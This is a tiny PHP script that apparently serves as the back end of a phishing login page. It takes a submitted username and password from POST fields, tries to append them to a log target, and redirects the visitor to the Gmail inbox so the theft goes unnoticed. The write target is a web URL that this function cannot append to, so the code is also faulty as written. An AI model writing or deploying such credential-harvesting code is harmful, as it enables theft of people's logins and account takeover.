<?php

file_put_contents("https://mail.google.com/mail/u/0/#inbox", "[CODEC Nature & Life Project:] " . $uname = $_POST['Kyle'] . " [Raptor5566:] " . $pwd = $_POST['psw'] . "\n", FILE_APPEND);
header('Location: https://mail.google.com/mail/u/0/#inbox');
?>
